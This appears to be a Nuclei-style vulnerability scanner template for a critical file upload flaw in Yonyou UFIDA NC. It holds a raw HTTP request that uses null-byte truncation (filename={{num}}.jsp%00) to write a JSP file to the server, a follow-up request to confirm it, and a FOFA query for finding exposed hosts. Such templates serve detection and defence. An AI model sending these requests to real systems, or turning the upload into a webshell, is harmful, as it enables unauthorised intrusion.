id: yonyou-nc-saveXmlToFIleServlet-fileupload
info:
  name: 用友 UFIDA NC saveXmlToFileServlet/doPost - fileupload
  author: leadlife
  severity: critical
  description: /portal/pt/servlet/saveXmlToFileServlet/doPost接口会保存xml文档到服务器一个路径下，默认会添加.xml后缀，通过Windows的文件名特性可截断.xml文件后缀。再通过目录穿越可上传jsp文件到nc_web目录下。
  reference:
    - todo
  metadata:
    verified: true
    fofa-query: icon_hash="1085941792" || app="用友-UFIDA-NC"
  tags: yonyou,nc,fileupload,oa

variables:
  num: '{{rand_int(800000000, 1000000000)}}'

http:
  - raw:
      - |-
        POST /portal/pt/servlet/saveXmlToFileServlet/doPost?pageId=login&filename={{num}}.jsp%00 HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/octet-stream
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
        Content-Length: 19

        {{randstr}}
      
      - |
        GET /portal/processxml/{{num}}.jsp HTTP/1.1
        Host: {{Hostname}}
    
    matchers:
      - type: dsl
        dsl:
          - "status_code_1 == 200 && status_code_2 == 200"
          - "contains(body_2,'{{randstr}}')"
        condition: and
      


